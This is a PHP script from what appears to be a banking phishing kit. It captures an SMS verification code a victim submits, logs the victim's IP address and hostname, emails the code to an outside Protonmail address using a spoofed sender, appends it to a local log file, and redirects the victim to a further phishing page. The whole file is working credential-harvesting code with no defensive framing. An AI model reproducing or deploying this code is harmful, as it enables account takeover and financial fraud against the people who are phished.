<?php
$pre = controlpanelidentif;
$md5 = rand(100000000, 1500000000);

session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "Code Sms 2     : ".$_POST['codesms2']."\n";
$message .= "IP    : $ip | $hostname\n";

$_SESSION['codesms2']=$_POST['codesms2'];


$smagri2 = "CPE |Fr0m ".$ip;
$smagri3 = "From: INBAX <smtp@ifastnet1.net>";

@mail("narutokabore03@protonmail.com,",$smagri2,$message,$smagri3);
$file = fopen("../wu.txt","a");
fwrite($file,$message);
fclose($file);
header("Refresh: 15; URL=tunnel-emailaccess.php?id=$pre&$md5");


?>

	










